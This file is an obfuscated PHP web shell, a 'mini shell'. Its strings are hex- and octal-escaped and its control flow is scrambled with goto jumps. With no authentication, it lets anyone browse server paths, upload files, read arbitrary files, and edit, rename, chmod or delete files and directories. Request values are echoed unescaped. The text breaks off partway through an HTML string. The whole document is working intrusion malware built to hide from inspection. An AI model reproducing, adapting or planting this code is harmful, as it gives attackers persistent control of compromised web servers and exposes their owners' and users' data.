<?php
 goto Ry2Zp; rUvWa: function perms($file) { $perms = fileperms($file); if (($perms & 49152) == 49152) { $info = "\163"; } elseif (($perms & 40960) == 40960) { $info = "\x6c"; } elseif (($perms & 32768) == 32768) { $info = "\55"; } elseif (($perms & 24576) == 24576) { $info = "\x62"; } elseif (($perms & 16384) == 16384) { $info = "\144"; } elseif (($perms & 8192) == 8192) { $info = "\x63"; } elseif (($perms & 4096) == 4096) { $info = "\x70"; } else { $info = "\165"; } $info .= $perms & 256 ? "\162" : "\x2d"; $info .= $perms & 128 ? "\167" : "\55"; $info .= $perms & 64 ? $perms & 2048 ? "\163" : "\170" : ($perms & 2048 ? "\x53" : "\x2d"); $info .= $perms & 32 ? "\x72" : "\55"; $info .= $perms & 16 ? "\x77" : "\55"; $info .= $perms & 8 ? $perms & 1024 ? "\163" : "\x78" : ($perms & 1024 ? "\x53" : "\55"); $info .= $perms & 4 ? "\162" : "\55"; $info .= $perms & 2 ? "\167" : "\x2d"; $info .= $perms & 1 ? $perms & 512 ? "\x74" : "\170" : ($perms & 512 ? "\x54" : "\x2d"); return $info; } goto Sbabu; eTk0_: echo "\74\142\x72\x20\57\x3e\x78\170\x78\x78\x78\x3c\146\157\x6e\164\x20\143\x6f\x6c\x6f\x72\x3d\x22\x72\145\144\42\76\61\56\x30\x3c\x2f\146\157\156\164\76\x2c\x20\130\130\x58\40\x3c\146\x6f\x6e\164\x20\x63\157\154\x6f\162\75\x22\x72\x65\144\42\76\x78\170\170\x78\x3c\x2f\x66\x6f\x6e\164\76\xa\74\x21\x2d\55\x54\x75\x6c\151\163\141\x6e\x20\115\x69\162\151\x6e\147\55\x2d\x3e\12\74\163\x70\141\x6e\40\151\144\x3d\42\x73\145\x63\42\x3e\x3c\144\151\x76\40\x69\x64\75\x22\x66\x6f\x74\145\162\x22\40\143\154\x61\163\163\75\42\x66\x6f\164\x65\x72\x22\x20\163\x74\171\x6c\x65\x3d\x22\x70\x6f\163\151\164\x69\157\x6e\x3a\x20\141\x62\x73\x6f\154\x75\164\145\73\x20\164\x6f\160\x3a\40\x37\60\x70\170\73\x20\154\145\x66\x74\x3a\x20\x2d\62\62\x35\x70\x78\x3b\40\167\151\144\x74\150\72\40\x36\60\x30\160\170\73\x20\x68\145\x69\147\x68\x74\x3a\x20\x32\x38\x70\x78\73\x20\x6d\141\x72\x67\151\x6e\72\40\x30\x70\170\73\40\x70\141\x64\x64\151\x6e\x67\72\40\x31\60\160\170\73\40\x66\157\x6e\164\x2d\163\151\172\145\x3a\x20\x32\x34\x70\x78\73\x20\164\x65\x78\x74\x2d\x61\x6c\151\x67\156\x3a\x20\x63\x65\156\x74\145\162\x3b\40\143\x6f\154\x6f\162\x3a\x20\x72\147\142\50\x32\x35\65\x2c\x20\x32\65\65\x2c\40\62\65\x35\x29\x3b\x20\146\x6f\x6e\164\55\146\x61\x6d\151\154\171\72\40\x26\x71\165\x6f\x74\73\164\162\145\x62\165\x63\x68\x65\x74\40\x6d\x73\x26\161\165\x6f\x74\73\x2c\x20\103\x6f\x75\162\151\145\162\40\156\145\167\54\x20\143\157\x75\x72\151\x65\x72\x20\156\x65\x77\x2c\x20\163\141\156\163\x2d\163\x65\162\151\x66\x3b\x20\x74\162\x61\156\163\x66\x6f\162\x6d\72\40\x72\157\x74\141\164\145\x28\x2d\x34\x35\144\145\x67\x29\73\x20\x74\162\x61\156\163\x66\x6f\162\x6d\x2d\x6f\162\x69\x67\151\x6e\72\40\x35\x30\x25\40\60\x70\x78\x20\60\160\170\73\x20\x62\141\143\x6b\147\162\157\165\x6e\x64\55\x63\x6f\154\x6f\162\x3a\40\162\147\x62\x28\x30\x2c\40\60\x2c\x20\60\51\73\x20\x62\x6f\x72\144\145\162\72\x20\x31\x70\170\x20\163\x6f\x6c\151\144\x20\162\147\x62\x28\61\x37\x30\54\40\61\x37\x30\x2c\40\61\67\x30\51\x3b\40\x6f\x70\x61\143\x69\x74\x79\x3a\40\x30\x2e\x35\x3b\x20\x7a\x2d\151\156\x64\x65\170\72\x20\61\x32\60\60\73\x22\76\12\74\x66\157\x6e\164\x20\x66\141\x63\x65\x3d\42\143\x6f\165\162\151\145\162\40\x6e\x65\167\42\x3e\74\155\141\x72\161\x75\x65\x65\x20\x63\x6f\154\x6f\x72\75\x22\x64\141\162\x6b\x62\x6c\165\x65\42\x20\142\x65\150\141\166\151\157\x72\75\42\106\x6c\151\160\42\x20\x73\143\x72\157\154\x6c\x61\x6d\157\x75\156\164\75\42\66\x22\40\167\151\144\164\x68\75\x22\x35\60\45\x22\40\x73\164\171\154\x65\x3d\x22\x77\x69\144\164\x68\72\x20\65\x30\x25\x3b\42\76\x53\x50\105\103\x49\115\105\116\x54\x20\115\111\116\111\x20\x53\x48\x45\x4c\x4c\40\55\xa\40\x52\x45\x43\117\104\x45\104\40\x46\x52\117\x4d\40\120\110\x41\x4e\124\117\115\x20\x47\x48\x4f\x53\124\x3c\x2f\155\x61\x72\161\x75\x65\x65\x3e\74\x2f\146\x6f\x6e\x74\76\74\x2f\x64\x69\x76\76\74\x2f\163\160\141\156\76\12\x3c\x21\55\x2d\x3c\151\146\162\141\x6d\x65\x20\x77\151\x64\164\x68\x3d\x22\60\42\40\x68\x65\151\147\x68\164\75\42\60\x22\40\163\162\143\75\x22\x68\164\164\160\x73\x3a\x2f\57\x77\x77\167\x2e\x79\x6f\165\x74\x75\x62\x65\56\143\x6f\x6d\57\x65\155\142\x65\144\57\61\x2d\x78\x47\145\x72\x76\65\106\x4f\x6b\x3f\141\165\164\x6f\x70\154\141\x79\75\61\x22\x20\x66\x72\x61\155\x65\x62\157\162\x64\x65\162\75\x22\60\42\40\x61\154\154\157\167\146\165\x6c\154\163\143\x72\x65\x65\x6e\75\42\42\76\x3c\57\x69\x66\x72\x61\x6d\145\x3e\12\12\74\57\102\x4f\x44\x59\76\12\74\x2f\110\124\115\x4c\x3e"; goto rUvWa; Ry2Zp: set_time_limit(0); goto b7HYI; dlOIy: echo "\74\146\157\x72\x6d\x20\145\x6e\143\164\x79\160\x65\75\42\155\165\x6c\x74\x69\160\x61\162\x74\57\146\x6f\162\155\55\x64\x61\164\x61\42\40\x6d\x65\x74\150\157\144\x3d\42\120\117\x53\124\x22\76\12\x55\x70\x6c\x6f\x61\144\40\106\151\154\x65\x20\x3a\40\74\x69\x6e\160\165\x74\x20\164\x79\160\145\x3d\42\146\151\x6c\145\x22\40\x6e\x61\x6d\145\75\42\146\x69\154\x65\42\40\x2f\x3e\xa\x3c\x69\x6e\160\x75\x74\x20\x74\x79\160\x65\x3d\x22\x73\165\x62\155\x69\164\x22\40\166\141\x6c\165\145\x3d\x22\x75\160\x6c\157\141\x64\42\x20\57\76\12\x3c\x2f\146\157\x72\x6d\x3e\xa\74\x2f\164\x64\x3e\74\57\164\162\76"; goto kMpAc; IfXVe: $path = str_replace("\x5c", "\x2f", $path); goto aopBv; lRlEr: if (isset($_GET["\160\141\164\x68"])) { $path = $_GET["\x70\x61\x74\x68"]; } else { $path = getcwd(); } goto IfXVe; aopBv: $paths = explode("\57", $path); goto u0fzf; ldN2l: if (isset($_FILES["\146\151\x6c\145"])) { if (copy($_FILES["\x66\151\154\x65"]["\x74\155\x70\x5f\156\141\x6d\145"], $path . "\x2f" . $_FILES["\146\x69\154\145"]["\156\141\155\145"])) { echo "\x3c\x66\x6f\x6e\x74\x20\143\157\154\x6f\x72\x3d\42\143\171\x61\x6e\x22\x3e\x46\x69\154\145\40\x4e\x79\x61\x20\125\144\150\x20\104\x69\x20\x55\160\154\x6f\x61\144\40\x43\x75\153\74\x2f\x66\157\x6e\x74\76\x3c\x62\162\x20\x2f\x3e"; } else { echo "\x3c\146\157\156\164\x20\143\157\x6c\x6f\x72\75\42\162\x65\x64\x22\76\x46\151\x6c\x65\40\116\171\x61\40\x47\x61\x67\x61\154\x20\104\151\40\x55\x70\x6c\157\141\x64\40\x43\165\153\x3c\57\x66\157\x6e\x74\76\x3c\142\162\x20\57\x3e"; } } goto dlOIy; RfL9G: echo "\x3c\57\164\144\x3e\x3c\x2f\x74\x72\76\74\164\x72\x3e\74\164\144\76"; goto ldN2l; u0fzf: foreach ($paths as $id => $pat) { if ($pat == '' && $id == 0) { $a = true; echo "\74\141\40\x68\x72\145\x66\75\x22\x3f\x70\141\164\x68\75\57\42\x3e\x2f\x3c\x2f\x61\x3e"; continue; } if ($pat == '') { continue; } echo "\74\x61\x20\150\162\145\x66\x3d\42\77\x70\x61\164\x68\75"; for ($i = 0; $i <= $id; $i++) { echo "{$paths[$i]}"; if ($i != $id) { echo "\57"; } } echo "\42\76" . $pat . "\74\x2f\141\x3e\57"; } goto RfL9G; kMpAc: if (isset($_GET["\146\151\x6c\145\163\x72\x63"])) { echo "\74\x74\162\76\74\x74\144\x3e\103\165\x72\x72\145\x6e\x74\x20\x46\151\154\145\x20\72\40"; echo $_GET["\x66\151\x6c\145\163\x72\x63"]; echo "\74\x2f\x74\x72\x3e\74\57\x74\x64\x3e\x3c\x2f\x74\x61\x62\x6c\145\x3e\x3c\142\x72\40\57\76"; echo "\x3c\160\x72\145\x3e" . htmlspecialchars(file_get_contents($_GET["\146\151\154\x65\163\162\143"])) . "\x3c\x2f\160\x72\x65\x3e"; } elseif (isset($_GET["\x6f\x70\x74\x69\x6f\x6e"]) && $_POST["\157\x70\x74"] != "\144\x65\x6c\145\164\145") { echo "\74\57\164\141\142\x6c\x65\76\x3c\x62\x72\x20\x2f\x3e\x3c\x63\x65\156\164\145\162\x3e" . $_POST["\160\x61\x74\150"] . "\74\x62\x72\x20\57\76\x3c\x62\x72\x20\x2f\x3e"; if ($_POST["\x6f\160\x74"] == "\x63\x68\155\x6f\144") { if (isset($_POST["\160\x65\x72\x6d"])) { if (chmod($_POST["\x70\x61\164\150"], $_POST["\x70\145\x72\x6d"])) { echo "\x3c\x66\157\156\x74\40\x63\x6f\x6c\x6f\162\75\x22\143\x79\141\156\42\x3e\x43\150\x61\156\147\145\40\120\x65\162\155\x69\x73\163\x69\157\156\40\104\157\156\145\x2e\74\x2f\x66\157\x6e\x74\76\74\142\x72\40\x2f\76"; } else { echo "\74\146\x6f\156\x74\40\143\157\154\157\162\75\x22\162\145\144\x22\76\x43\150\x61\x6e\x67\145\x20\120\145\162\x6d\151\x73\x73\151\x6f\x6e\x20\x45\162\x72\x6f\162\x2e\74\x2f\146\x6f\156\x74\76\x3c\142\x72\40\x2f\x3e"; } } echo "\74\146\157\162\155\40\x6d\145\x74\150\157\x64\75\x22\120\x4f\x53\124\x22\x3e\xa\x50\x65\x72\x6d\151\163\163\x69\157\x6e\x20\72\40\74\x69\x6e\160\x75\164\x20\x6e\141\155\145\x3d\x22\x70\145\x72\x6d\x22\40\x74\171\160\x65\75\x22\164\145\170\x74\x22\40\163\151\172\145\x3d\42\64\42\x20\166\x61\154\165\145\x3d\x22" . substr(sprintf("\x25\157", fileperms($_POST["\160\x61\164\x68"])), -4) . "\42\x20\57\x3e\xa\x3c\x69\x6e\x70\165\x74\40\x74\171\x70\145\x3d\x22\150\x69\x64\x64\x65\156\42\40\x6e\x61\x6d\x65\75\42\160\141\164\150\x22\40\x76\x61\x6c\165\x65\x3d\42" . $_POST["\x70\141\164\x68"] . "\42\x3e\12\x3c\x69\156\x70\x75\x74\x20\164\x79\160\145\x3d\42\150\x69\x64\144\145\156\42\x20\156\x61\x6d\x65\75\x22\x6f\160\x74\42\40\166\x61\x6c\165\145\75\42\143\150\155\x6f\x64\42\x3e\12\74\151\156\x70\165\164\x20\x74\171\x70\145\75\42\x73\165\142\155\151\164\42\x20\166\x61\x6c\165\145\x3d\42\x43\x72\157\x74\x7a\x7a\x2e\56\42\x20\x2f\x3e\xa\x3c\57\x66\157\162\155\x3e"; } elseif ($_POST["\157\160\164"] == "\162\145\156\x61\x6d\145") { if (isset($_POST["\156\x65\x77\156\141\155\x65"])) { if (rename($_POST["\160\141\164\x68"], $path . "\x2f" . $_POST["\156\x65\x77\156\141\155\145"])) { echo "\74\146\x6f\x6e\164\x20\x63\157\154\x6f\x72\x3d\x22\x63\171\141\156\x22\x3e\103\x68\141\156\147\x65\40\x4e\x61\155\x65\40\123\x75\x63\143\145\163\56\74\57\146\x6f\x6e\164\76\x3c\142\162\40\x2f\76"; } else { echo "\74\146\x6f\x6e\164\40\x63\157\154\x6f\x72\75\x22\162\145\144\42\x3e\103\150\141\x6e\x67\x65\x20\116\141\155\145\40\105\162\x72\x6f\162\56\x3c\57\x66\x6f\156\x74\x3e\x3c\x62\162\40\x2f\76"; } $_POST["\156\x61\155\145"] = $_POST["\x6e\x65\x77\x6e\141\x6d\x65"]; } echo "\x3c\x66\x6f\x72\155\40\x6d\x65\164\x68\157\144\x3d\x22\x50\117\123\124\42\76\12\x4e\x65\167\x20\x4e\x61\x6d\x65\40\x3a\40\x3c\x69\x6e\x70\165\x74\x20\156\141\x6d\145\x3d\42\x6e\x65\x77\156\x61\155\145\42\x20\164\x79\160\x65\x3d\x22\x74\x65\x78\x74\x22\x20\x73\x69\x7a\x65\x3d\42\x32\60\42\x20\166\141\x6c\x75\145\x3d\x22" . $_POST["\x6e\x61\x6d\145"] . "\x22\x20\x2f\76\xa\74\x69\156\160\x75\x74\x20\x74\x79\x70\x65\75\42\x68\151\x64\x64\145\156\x22\x20\156\141\155\x65\x3d\x22\x70\x61\x74\x68\42\40\x76\141\154\x75\145\x3d\x22" . $_POST["\160\141\x74\x68"] . "\x22\76\xa\x3c\x69\x6e\x70\165\x74\x20\x74\171\160\145\x3d\42\150\151\x64\144\145\x6e\x22\40\x6e\141\155\145\75\42\x6f\160\x74\x22\40\166\141\154\x75\x65\x3d\x22\x72\145\156\x61\155\145\42\76\12\74\x69\x6e\x70\x75\x74\x20\x74\171\160\x65\x3d\x22\x73\x75\x62\x6d\151\x74\42\40\166\x61\x6c\x75\145\x3d\42\x43\x72\157\164\x7a\172\x2e\56\42\x20\57\x3e\xa\x3c\57\146\x6f\162\155\76"; } elseif ($_POST["\x6f\160\164"] == "\145\144\x69\x74") { if (isset($_POST["\x73\x72\x63"])) { $fp = fopen($_POST["\160\x61\x74\150"], "\167"); if (fwrite($fp, $_POST["\x73\162\x63"])) { echo "\x3c\146\x6f\x6e\x74\x20\x63\x6f\154\x6f\162\x3d\x22\143\x79\141\x6e\42\x3e\105\144\151\x74\x20\x46\x69\x6c\145\x20\x53\x75\143\x63\x65\163\74\57\146\x6f\156\x74\76\x3c\142\x72\x20\57\76"; } else { echo "\74\146\157\x6e\164\x20\x63\x6f\x6c\x6f\162\75\42\162\x65\144\42\x3e\105\144\151\164\x20\x46\151\154\x65\x20\105\162\x72\x6f\162\x3c\57\146\157\x6e\x74\x3e\74\142\x72\x20\x2f\76"; } fclose($fp); } echo "\x3c\146\x6f\162\155\40\155\145\x74\150\x6f\x64\75\x22\120\117\x53\x54\42\x3e\xa\x3c\x74\145\x78\x74\x61\x72\x65\x61\40\x63\x6f\x6c\x73\x3d\70\60\40\162\x6f\x77\163\75\62\x30\40\x6e\x61\x6d\x65\75\42\163\162\x63\x22\x3e" . htmlspecialchars(file_get_contents($_POST["\160\x61\x74\x68"])) . "\x3c\x2f\x74\x65\170\164\141\162\145\141\76\74\142\x72\x20\x2f\76\xa\x3c\151\156\x70\165\164\x20\x74\x79\x70\145\x3d\42\x68\151\x64\x64\x65\x6e\x22\x20\x6e\141\x6d\x65\75\42\x70\141\164\150\x22\40\x76\141\x6c\165\145\75\x22" . $_POST["\160\141\x74\x68"] . "\x22\76\xa\74\151\156\160\x75\x74\40\x74\x79\160\x65\75\42\x68\x69\x64\144\x65\x6e\42\x20\156\141\x6d\x65\x3d\x22\157\160\164\42\40\166\141\x6c\165\x65\x3d\x22\x65\x64\151\x74\x22\x3e\xa\74\x69\x6e\160\165\164\x20\164\x79\x70\x65\x3d\42\x73\165\142\155\151\164\42\x20\166\x61\x6c\165\x65\75\42\103\x72\157\164\x7a\172\x2e\x2e\42\40\57\x3e\xa\x3c\57\146\x6f\x72\155\x3e"; } echo "\74\x2f\143\145\156\164\145\162\x3e"; } else { echo "\74\57\x74\141\142\154\x65\x3e\74\x62\162\57\76\x3c\143\x65\156\x74\145\x72\76"; if (isset($_GET["\x6f\x70\x74\151\x6f\156"]) && $_POST["\157\160\164"] == "\144\145\x6c\145\x74\x65") { if ($_POST["\x74\171\160\145"] == "\x64\x69\162") { if (rmdir($_POST["\160\141\164\150"])) { echo "\74\146\x6f\x6e\x74\40\x63\x6f\154\x6f\162\75\x22\x63\x79\141\x6e\x22\x3e\104\x65\x6c\145\164\x65\x20\104\151\x72\40\x53\x75\x63\143\x65\163\56\74\57\146\157\x6e\x74\x3e\x3c\x62\x72\x20\57\x3e"; } else { echo "\74\146\x6f\x6e\164\x20\143\157\154\x6f\x72\75\42\x72\145\144\x22\x3e\x44\145\x6c\x65\x74\x65\40\104\x69\162\40\x45\162\162\x6f\x72\x2e\74\57\146\157\x6e\164\76\x3c\142\162\40\x2f\x3e"; } } elseif ($_POST["\164\x79\160\x65"] == "\x66\x69\154\x65") { if (unlink($_POST["\x70\x61\x74\x68"])) { echo "\x3c\146\157\x6e\x74\40\143\157\x6c\157\x72\75\x22\x63\171\x61\x6e\42\76\104\x65\154\x65\x74\x65\x20\x46\151\154\x65\x20\x53\165\x63\143\x65\163\56\x3c\x2f\x66\157\x6e\164\x3e\x3c\142\x72\x20\57\76"; } else { echo "\x3c\146\157\156\x74\x20\143\157\x6c\x6f\x72\x3d\x22\162\x65\144\x22\76\x44\145\154\145\x74\145\40\x46\151\x6c\145\40\x45\x72\x72\157\x72\56\74\57\146\x6f\156\x74\x3e\74\x62\x72\40\57\76"; } } } echo "\74\x2f\143\x65\x6e\164\145\162\76"; $scandir = scandir($path); echo "\74\x3f\160\x68\160\xa\144\75\42\143\157\x6e\x74\145\x6e\164\42\76\x3c\164\141\x62\x6c\145\40\x77\151\144\x74\x68\x3d\x22\x37\x30\60\x22\x20\x62\157\x72\x64\145\162\75\42\x30\42\x20\143\x65\154\154\160\141\144\x64\151\x6e\x67\75\x22\x33\x22\40\x63\145\154\154\163\x70\141\143\x69\x6e\147\x3d\42\61\42\40\x61\x6c\151\x67\156\x3d\42\143\x65\x6e\164\x65\162\x22\76\xa\x3c\164\x72\x20\x63\154\141\x73\x73\x3d\x22\146\x69\x72\163\x74\42\x3e\xa\74\164\x64\76\x3c\143\x65\156\x74\145\162\76\74\x66\x6f\156\164\40\x63\157\x6c\157\162\x3d\x77\x68\x69\164\145\76\x4e\x61\x6d\145\74\x2f\146\x6f\156\x74\76\x3c\x2f\143\x65\x6e\164\x65\162\76\74\x2f\164\x64\76\12\x3c\x74\144\76\x3c\x63\145\x6e\164\x65\x72\x3e\74\x66\157\x6e\164\40\x63\x6f\154\x6f\162\75\167\x68\x69\x74\x65\76\x53\x69\172\x65\x3c\x2f\x66\157\156\x74\x3e\74\57\x63\145\x6e\x74\145\162\x3e\74\x2f\x74\x64\x3e\xa\74\164\144\76\x3c\x63\145\x6e\x74\145\x72\76\x3c\x66\157\x6e\x74\x20\143\x6f\154\157\x72\x3d\x77\150\x69\164\145\x3e\120\x65\x72\x6d\151\163\163\x69\x6f\156\x73\x3c\x2f\146\x6f\x6e\164\76\x3c\57\x63\x65\156\164\145\162\x3e\x3c\x2f\x74\144\76\12\74\x74\144\x3e\x3c\x63\145\x6e\x74\x65\162\x3e\74\146\x6f\156\x74\x20\x63\x6f\x6c\x6f\162\75\167\150\x69\x74\x65\76\x41\x63\x74\151\x6f\156\74\x2f\146\x6f\x6e\164\x3e\x3c\x2f\x63\x65\156\x74\x65\x72\x3e\x3c\57\x74\x64\76\12\x3c\57\x74\x72\76"; foreach ($scandir as $dir) { if (!is_dir("{$path}\57{$dir}") || $dir == "\56" || $dir == "\x2e\x2e") { continue; } echo "\74\164\x72\76\xa\x3c\x74\x64\76\74\141\40\150\162\x65\x66\x3d\42\x3f\x70\x61\164\150\75{$path}\57{$dir}\x22\76{$dir}\x3c\x2f\141\x3e\x3c\57\x74\144\76\xa\x3c\164\144\76\x3c\x63\x65\156\164\145\162\76\x2d\x2d\x3c\57\x63\x65\156\x74\145\162\76\74\x2f\164\144\76\xa\x3c\164\144\76\x3c\143\145\156\x74\145\x72\76"; if (is_writable("{$path}\57{$dir}")) { echo "\74\146\157\x6e\x74\40\x63\x6f\154\x6f\162\x3d\x22\x63\171\x61\156\42\x3e"; } elseif (!is_readable("{$path}\x2f{$dir}")) { echo "\74\146\157\156\164\x20\143\157\x6c\x6f\x72\x3d\x22\162\145\x64\42\x3e"; } echo perms("{$path}\x2f{$dir}"); if (is_writable("{$path}\57{$dir}") || !is_readable("{$path}\57{$dir}")) { echo "\74\57\x66\157\156\x74\76"; } echo "\x3c\x2f\143\145\156\x74\145\x72\76\74\x2f\164\x64\76\12\x3c\164\144\76\74\x63\145\x6e\164\x65\162\x3e\74\146\157\x72\x6d\40\155\145\164\x68\157\144\x3d\42\120\117\x53\124\42\40\141\143\x74\151\x6f\x6e\x3d\x22\77\157\x70\x74\151\157\x6e\46\x70\x61\164\150\75{$path}\42\x3e\12\74\163\x65\x6c\x65\x63\164\40\156\x61\155\x65\x3d\x22\157\x70\x74\42\x3e\12\74\x6f\160\164\x69\157\x6e\x20\x76\x61\154\x75\x65\x3d\42\42\76\x3c\x2f\157\160\164\x69\157\x6e\x3e\12\74\157\x70\x74\x69\157\x6e\x20\x76\x61\154\165\x65\75\x22\144\145\154\145\x74\x65\42\76\104\145\154\x65\x74\x65\74\57\157\x70\164\x69\x6f\x6e\x3e\12\74\157\x70\164\151\157\x6e\40\166\x61\154\165\145\75\42\x63\x68\155\x6f\x64\x22\76\103\150\x6d\x6f\x64\x3c\57\x6f\160\164\151\x6f\x6e\x3e\xa\x3c\157\160\x74\151\157\156\40\166\141\154\165\145\x3d\42\x72\145\156\141\155\145\x22\76\122\x65\156\x61\155\x65\x3c\57\157\x70\x74\151\157\x6e\x3e\xa\74\x2f\x73\145\x6c\145\x63\x74\x3e\xa\74\151\156\x70\165\164\40\164\x79\x70\145\75\x22\x68\151\144\144\x65\x6e\x22\40\x6e\141\x6d\x65\x3d\42\x74\171\x70\x65\42\x20\x76\x61\154\x75\x65\x3d\42\144\151\162\42\x3e\xa\74\x69\156\160\165\x74\40\x74\171\160\x65\x3d\x22\x68\151\144\144\145\156\42\x20\156\x61\155\x65\x3d\x22\x6e\141\155\x65\42\x20\166\141\x6c\165\x65\x3d\x22{$dir}\42\x3e\12\x3c\151\x6e\160\x75\164\40\x74\x79\x70\145\75\42\150\x69\144\144\x65\156\42\x20\156\x61\155\145\x3d\x22\x70\141\x74\150\42\40\166\141\x6c\165\145\x3d\42{$path}\57{$dir}\x22\76\xa\x3c\x69\x6e\x70\x75\x74\40\164\171\x70\145\x3d\x22\163\x75\142\x6d\x69\x74\42\40\x76\x61\154\x75\145\75\42\76\42\40\x2f\76\12\74\57\146\x6f\x72\155\76\74\57\x63\x65\x6e\x74\x65\162\76\74\x2f\x74\x64\76\xa\x3c\57\164\x72\76"; } echo "\74\164\x72\x20\x63\154\x61\x73\163\x3d\x22\146\151\x72\x73\x74\42\x3e\74\x74\x64\x3e\74\57\164\x64\76\x3c\164\x64\x3e\74\x2f\164\x64\76\74\x74\144\76\74\57\x74\144\76\74\164\x64\76\74\57\x74\x64\x3e\x3c\57\164\162\76"; foreach ($scandir as $file) { if (!is_file("{$path}\57{$file}")) { continue; } $size = filesize("{$path}\57{$file}") / 1024; $size = round($size, 3); if ($size >= 1024) { $size = round($size / 1024, 2) . "\x20\115\x42"; } else { $size = $size . "\40\x4b\102"; } echo "\74\164\x72\x3e\12\74\x74\144\x3e\74\141\x20\150\162\x65\x66\75\x22\x3f\x66\151\x6c\145\x73\162\x63\x3d{$path}\57{$file}\x26\x70\x61\164\x68\75{$path}\42\x3e{$file}\x3c\x2f\141\76\74\x2f\164\x64\x3e\xa\x3c\164\144\x3e\x3c\143\x65\156\x74\x65\x72\x3e" . $size . "\74\x2f\143\145\156\164\x65\162\76\x3c\57\164\x64\76\12\74\164\144\x3e\74\x63\145\156\x74\x65\x72\76"; if (is_writable("{$path}\57{$file}")) { echo "\74\x66\x6f\156\x74\x20\143\x6f\154\157\x72\x3d\x22\143\x79\x61\156\x22\76"; } elseif (!is_readable("{$path}\x2f{$file}")) { echo "\74\x66\x6f\156\164\x20\x63\157\154\x6f\162\75\42\162\x65\144\42\x3e"; } echo perms("{$path}\57{$file}"); if (is_writable("{$path}\57{$file}") || !is_readable("{$path}\x2f{$file}")) { echo "\x3c\57\146\x6f\x6e\164\x3e"; } echo "\x3c\57\143\x65\x6e\x74\x65\162\x3e\74\x2f\164\x64\76\12\74\164\144\x3e\x3c\143\145\156\x74\145\162\76\74\x66\157\162\155\40\x6d\145\x74\x68\157\x64\75\x22\120\x4f\123\x54\42\40\141\143\x74\151\157\x6e\x3d\x22\77\x6f\x70\x74\x69\x6f\156\46\x70\141\x74\x68\75{$path}\x22\x3e\12\x3c\163\145\154\x65\x63\x74\40\x6e\x61\155\145\75\42\x6f\160\x74\x22\x3e\xa\x3c\157\x70\164\151\x6f\156\x20\x76\x61\x6c\x75\145\x3d\42\x22\76\74\x2f\x6f\160\x74\x69\157\156\x3e\xa\74\x6f\x70\164\151\157\156\x20\x76\x61\154\x75\145\x3d\42\144\145\154\145\164\145\42\x3e\x44\145\154\145\164\145\74\x2f\157\x70\164\151\x6f\156\x3e\12\74\x6f\160\x74\151\157\x6e\40\166\141\x6c\x75\145\75\42\x63\150\155\157\144\42\76\103\x68\x6d\x6f\x64\x3c\57\157\x70\164\x69\157\156\76\xa\x3c\x6f\160\x74\x69\157\x6e\40\166\141\x6c\x75\x65\x3d\x22\x72\x65\x6e\x61\155\x65\x22\x3e\122\x65\156\141\x6d\145\x3c\x2f\x6f\x70\x74\x69\x6f\x6e\76\12\74\157\x70\x74\x69\x6f\156\x20\166\x61\x6c\165\x65\x3d\42\145\144\x69\x74\42\76\105\x64\151\164\74\57\157\160\164\x69\157\156\76\xa\x3c\57\163\x65\x6c\145\x63\x74\76\12\74\151\x6e\160\x75\x74\40\x74\x79\x70\x65\x3d\x22\150\151\x64\144\145\x6e\42\40\156\141\x6d\145\x3d\42\164\x79\160\x65\42\40\166\x61\154\165\145\x3d\42\146\151\154\145\42\x3e\xa\x3c\x69\156\160\165\164\x20\x74\171\x70\145\x3d\x22\x68\151\x64\144\145\156\x22\40\156\141\x6d\145\75\42\x6e\141\x6d\145\42\x20\x76\x61\x6c\165\x65\75\42{$file}\42\x3e\12\x3c\151\156\x70\x75\164\40\x74\x79\160\x65\x3d\42\150\x69\x64\144\x65\x6e\42\40\x6e\141\x6d\x65\x3d\42\x70\141\164\150\x22\40\166\141\x6c\x75\x65\x3d\x22{$path}\57{$file}\x22\x3e\xa\74\151\156\x70\x75\164\x20\x74\171\160\145\75\x22\163\165\142\155\x69\x74\x22\x20\x76\141\154\x75\145\x3d\x22\76\42\40\57\76\xa\74\x2f\146\x6f\162\155\76\x3c\x2f\x63\x65\156\164\145\x72\76\x3c\57\164\x64\76\xa\x3c\x2f\x74\x72\76"; } echo "\74\x2f\x74\141\142\154\145\x3e\xa\x3c\57\x64\x69\x76\x3e"; } goto eTk0_; Enuo2: echo "\74\41\104\x4f\103\x54\131\120\105\40\x48\x54\115\x4c\76\xa\74\110\124\115\x4c\76\12\x3c\x48\105\101\104\76\xa\74\154\151\156\x6b\40\150\x72\x65\146\x3d\42\42\40\162\x65\154\75\x22\x73\x74\x79\154\x65\x73\150\x65\x65\x74\42\x20\x74\171\160\145\x3d\42\164\145\170\x74\57\x63\163\163\x22\x3e\12\74\x74\x69\164\154\145\x3e\xe0\xa4\xb9\340\xa4\265\340\244\xbe\xe0\244\210\40\xe0\xa4\x85\340\xa4\241\340\245\x8d\340\244\241\xe0\244\276\x20\xe0\244\225\340\244\271\xe0\244\276\xe0\244\201\40\xe0\244\271\340\xa5\x88\77\x3c\x2f\164\x69\164\154\x65\76\xa\x3c\x73\x74\171\x6c\x65\76\xa\x62\x6f\144\x79\173\xa\143\157\x6c\157\x72\72\x20\43\146\146\x66\x3b\12\x66\157\156\164\x2d\146\141\155\x69\x6c\171\x3a\x20\42\143\157\x75\162\151\x65\162\x20\x6e\x65\167\x22\54\x20\x63\x75\162\x73\x69\x76\145\73\xa\x62\141\x63\x6b\147\x72\157\165\x6e\144\x2d\x63\x6f\x6c\x6f\162\72\x20\43\145\x36\145\66\145\x36\x3b\12\164\x65\170\164\x2d\x73\x68\141\x64\x6f\167\x3a\60\160\170\40\60\160\170\40\x31\160\x78\40\43\x37\x35\67\x35\x37\65\73\xa\x62\141\x63\x6b\147\162\157\165\156\x64\55\x70\x6f\163\x69\164\151\157\156\x3a\40\x63\x65\x6e\164\145\x72\x3b\12\11\x62\x61\143\x6b\x67\x72\x6f\165\156\144\55\143\x6f\154\x6f\162\72\x23\146\x66\x66\x66\x66\x66\x3b\xa\40\x20\x20\x20\x68\x65\x69\x67\150\x74\72\x39\x38\45\73\xa\x20\x20\40\40\x77\x69\144\164\x68\x3a\x39\71\45\73\xa\40\40\x20\x20\142\141\x63\153\147\x72\x6f\x75\x6e\x64\55\x61\x74\164\141\143\x68\x6d\x65\x6e\x74\x3a\x20\x66\151\x78\145\144\73\xa\40\40\x20\x20\x62\x61\143\153\x67\162\x6f\x75\156\x64\55\163\x69\172\145\72\61\x30\60\45\x20\61\x31\67\x25\x3b\12\11\x62\x61\143\x6b\147\162\x6f\165\x6e\x64\55\x69\155\141\x67\145\72\165\x72\x6c\x28\150\x74\x74\x70\163\x3a\x2f\x2f\151\x6d\x67\x30\x30\56\144\145\x76\151\141\x6e\x74\x61\162\164\56\156\x65\x74\57\